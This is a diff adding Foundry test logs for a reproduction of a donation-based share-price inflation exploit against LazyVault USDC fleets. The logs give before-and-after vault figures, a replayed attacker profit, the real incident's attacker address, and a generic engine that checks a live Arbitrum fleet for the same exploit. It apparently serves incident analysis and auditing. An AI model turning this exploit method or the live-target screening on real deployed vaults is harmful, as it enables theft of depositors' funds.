@@ -1,0 +1,107 @@
+No files changed, compilation skipped
+
+Ran 2 tests for test/Exploit_Repro.t.sol:Exploit_Repro
+[PASS] test_donationInflation_sensitivity() (gas: 10280636)
+Logs:
+  == fleet (before) ==
+    totalAssets            : 9680827973743
+    totalSupply            : 9077330141364
+    PPS (per 1e6 shares)   : 1066484
+    withdrawableTotalAssets: 1605240564038
+    ark.totalAssets        : 0
+    vault.maxWithdraw(ark) : 0
+  == donation ==
+    donated shares         : 5000000000000000
+    credited NAV (USDC)    : 1821149917443
+  == fleet (after) ==
+    totalAssets            : 11501977891186
+    PPS (per 1e6 shares)   : 1267110
+    withdrawableTotalAssets: 1605240564038
+    ark.totalAssets        : 1821149917443
+    NAV increase (credited): 1821149917443
+    withdrawable increase   : 0
+
+[PASS] test_simplified_profit_replay() (gas: 10237226)
+Logs:
+  == attacker deposit ==
+    deposited (USDC)  : 50000000000
+    shares received   : 46883025739
+    PPS after deposit : 1066484
+  == after donation ==
+    donated shares    : 19075252173684501
+    credited NAV      : 6947778784265
+    fleet totalAssets : 16678606758008
+    PPS inflated      : 1827950
+  == redeem ==
+    assets out        : 85712261866
+    deposit           : 50000000000
+    net profit (USDC) : 35712261866
+  == real 2026-07-06 outcome (ground truth, not replayed) ==
+    real donation shares : 19551517226711127
+    real credited NAV    : 7121298201390
+    real attacker DAI out: 6016754998120906520734632
+    attacker EOA         : 0x7BF716167B48CF527725722C6d79494b45B3BDCa
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 88.14s (169.45s CPU time)
+
+Ran 2 tests for test/Generic_Donation.t.sol:Generic_Donation
+[PASS] test_generic_arbitrum_live_candidate() (gas: 9229400)
+Logs:
+  ================================================================
+  Fleet : LazyVault_LowerRisk_USDC (Arbitrum)
+    fleet            : 0x4F63cfEa7458221CB3a0EEE2F31F7424Ad34bb58
+    ark (donation)   : 0x125dAE47930c1118cf2dB5A140877C64B408783C
+    ark share token  : 0x2BA39e5388aC6C702Cb29AEA78d52aa66832f1ee
+    -- before --
+    totalAssets            : 1250795250
+    PPS (per 1e6 shares)   : 982
+    withdrawableTotalAssets: 750014057
+    ark.totalAssets        : 500781193
+    vault.convertToAssets(1e18): 1861
+    vault.maxWithdraw(ark) : 0
+    max extractable        : 750014057
+    fleet.maxDeposit(this) : 0
+    -- after donation --
+    donated shares         : 1000000000000000000000
+    credited NAV (asset)   : 1861451
+    totalAssets            : 1252656701
+    PPS (per 1e6 shares)   : 984
+    withdrawableTotalAssets: 750014057
+    => net profit: 0 (exploit not executable here)
+       reason: fleet.maxDeposit == 0 (cannot obtain redeemable shares)
+       reason: ark token only acquirable at credited NAV (no below-NAV venue)
+    bufferArk.totalAssets : 414892848
+    liquid ark totalAssets: 335121209
+
+[PASS] test_generic_engine_ethereum_selftest() (gas: 20982043)
+Logs:
+  ================================================================
+  Fleet : LazyVault_LowerRisk_USDC (Ethereum)
+    fleet            : 0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17
+    ark (donation)   : 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2
+    ark share token  : 0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F
+    -- before --
+    totalAssets            : 9680827973743
+    PPS (per 1e6 shares)   : 1066484
+    withdrawableTotalAssets: 1605240564038
+    ark.totalAssets        : 0
+    vault.convertToAssets(1e18): 364229983488787
+    vault.maxWithdraw(ark) : 0
+    max extractable        : 1000000000
+    fleet.maxDeposit(this) : 50000000000
+    -- attacker deposit --
+    deposited             : 50000000000
+    shares received       : 46883025739
+    -- after donation --
+    donated shares         : 19075252173684501
+    credited NAV (asset)   : 6947778784265
+    totalAssets            : 16678606758008
+    PPS (per 1e6 shares)   : 1827950
+    withdrawableTotalAssets: 1655240564038
+    -- redeem --
+    assets out             : 85712261866
+    net profit             : 35712261866
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 88.14s (153.32s CPU time)
+
+Ran 2 test suites in 88.19s (176.28s CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
